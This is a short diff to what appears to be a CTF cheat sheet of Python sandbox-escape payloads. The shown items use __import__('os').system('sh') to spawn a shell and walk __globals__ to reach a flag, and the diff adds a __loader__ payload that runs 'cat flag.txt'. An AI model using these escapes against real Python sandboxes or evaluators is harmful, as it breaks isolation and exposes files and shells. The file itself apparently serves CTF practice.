@@ -18,6 +18,8 @@
 7. __import__("os").system("sh")
 
 8. __class__.__init__.__globals__.__getitem__ FLAG
+
+9. add __loader__().load_module('os').system('cat flag.txt')
 ```
 
 
